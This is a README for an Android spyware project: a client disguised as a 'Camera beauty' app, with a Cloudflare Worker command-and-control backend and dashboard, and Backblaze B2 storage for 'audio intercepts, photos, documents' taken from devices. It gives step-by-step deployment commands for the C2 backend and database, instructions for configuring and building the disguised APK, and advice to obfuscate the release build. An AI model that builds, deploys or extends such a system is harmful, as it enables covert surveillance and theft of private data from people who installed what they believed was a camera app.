# GoogleOperation / Camera Beauty System

A full-stack Android application with a serverless Cloudflare C2 backend and Backblaze B2 encrypted object storage.

---

## 🛠️ Infrastructure Overview

- **Android Client (`app/`)**: Native Kotlin / Jetpack Compose application disguised as `Camera beauty`.
- **Cloudflare Edge Backend (`backend/`)**: TypeScript / Hono API worker running on Cloudflare Workers edge network.
- **SQL Database**: Cloudflare D1 Serverless SQL (`operation-d1-db`).
- **Object Storage**: Backblaze B2 encrypted cloud storage for audio intercepts, photos, documents, and APK hosting.
- **C2 Dashboard**: Web command center served at `/` and `/c2`.

## 🚀 Setup & Deployment Guide

### 1. Backblaze B2 Setup
1. Create a free account at [Backblaze B2](https://www.backblaze.com/b2).
2. Create a bucket (set access to **Public** if serving direct downloads).
3. Generate an **Application Key** with Read and Write permissions.
4. Note your `Bucket Name`, `Key ID`, and `Application Key`.

### 2. Cloudflare Worker & D1 Setup
1. Navigate to the backend directory:
   ```bash
   cd backend
   npm install
   ```
2. Log in with Wrangler:
   ```bash
   npx wrangler login
   ```
3. Create your D1 SQL database:
   ```bash
   npx wrangler d1 create operation-d1-db
   ```
   Copy the `database_id` generated by the CLI.
4. Update `backend/wrangler.toml` with your credentials:
   ```toml
   [vars]
   B2_BUCKET_NAME = "YOUR_B2_BUCKET_NAME"
   B2_KEY_ID = "YOUR_B2_KEY_ID"
   B2_KEY_NAME = "YOUR_B2_KEY_NAME"
   B2_APPLICATION_KEY = "YOUR_B2_APPLICATION_KEY"

   [[d1_databases]]
   binding = "DB"
   database_name = "operation-d1-db"
   database_id = "YOUR_D1_DATABASE_ID"
   ```
5. Apply the database schema:
   ```bash
   npx wrangler d1 execute operation-d1-db --file=schema.sql --remote
   ```
6. Deploy the worker:
   ```bash
   npx wrangler deploy
   ```

---

### 3. Android Client Configuration
1. Update `app/src/main/java/com/opp/googleoperation/util/Constants.kt`:
   - Set `DEFAULT_WORKER_URL` to your deployed Cloudflare Worker URL (e.g. `https://google-operation-backend.<subdomain>.workers.dev`).
   - Set the B2 credentials (`B2_KEY_ID`, `B2_APPLICATION_KEY`, `B2_BUCKET_NAME`, `B2_KEY_NAME`).
2. Build the release APK:
   ```bash
   ./gradlew assembleRelease
   ```
3. Output APK location:
   `app/build/outputs/apk/release/app-release.apk`

## 🔒 Security Best Practices
- Never commit active API keys, secrets, or tokens to version control.
- Keep credentials in environment variables or `.local` configuration files.
- Use ProGuard/R8 rules to obfuscate and protect data models in release builds.
